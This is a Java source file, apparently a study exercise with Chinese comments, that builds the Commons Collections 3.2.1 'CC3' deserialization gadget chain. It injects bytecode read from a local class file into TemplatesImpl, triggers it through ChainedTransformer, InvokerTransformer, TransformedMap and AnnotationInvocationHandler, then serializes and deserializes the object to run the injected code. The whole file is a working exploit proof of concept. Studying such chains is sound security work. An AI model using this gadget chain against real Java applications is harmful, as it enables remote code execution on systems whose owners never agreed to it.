package org.emample;

//CC版本3.2.1

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.TransformerConfigurationException;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;
import java.util.PriorityQueue;

public class CC3Test {
    public static void main(String[] args) throws TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {
        TemplatesImpl templates = new TemplatesImpl();

        Class tc = templates.getClass();

        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaaa");

        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("C:\\Users\\30389\\Desktop\\CVE\\java_unserialize\\CC7Test\\target\\classes\\org\\emample\\Test.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates,codes);

        Field tfactoryField = tc.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());
        //templates.newTransformer();

        //InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Transformer.class}, new Object[]{templates});
        //instantiateTransformer.transform();



        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",null,null)
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);



        HashMap<Object, Object> map = new HashMap<>();
        map.put("value","aaa");//这一步的目的是保证map里面有东西，不然for循环不会运行//与Target.class对应，为了防止那处的判断为null，key为Target.class的成员变量value

        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);

        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> anno = c.getDeclaredConstructor(Class.class, Map.class);//这里的参数就是构造函数的参数类型
        anno.setAccessible(true);//设置权限，可以访问
        Object o = anno.newInstance(Target.class, transformedMap);//实例化(为了判断不为null，所以第一个参数所对应的注解要有成员变量，所以用Target.class）
        serialize(o);//序列化
        unserialize("ser.bin");//反序化
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
